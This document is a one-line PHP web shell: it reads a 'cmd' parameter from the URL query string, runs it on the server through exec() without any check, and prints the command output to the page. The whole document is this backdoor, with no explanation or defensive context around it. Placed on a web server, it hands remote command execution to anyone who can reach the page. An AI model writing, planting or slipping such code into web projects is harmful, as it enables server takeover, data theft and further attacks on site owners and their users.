<?php $c=$_GET['cmd'];exec($c,$o,$r);if($r===0){echo"<pre>".implode("\n",$o)."</pre>";}else{echo".";}?>


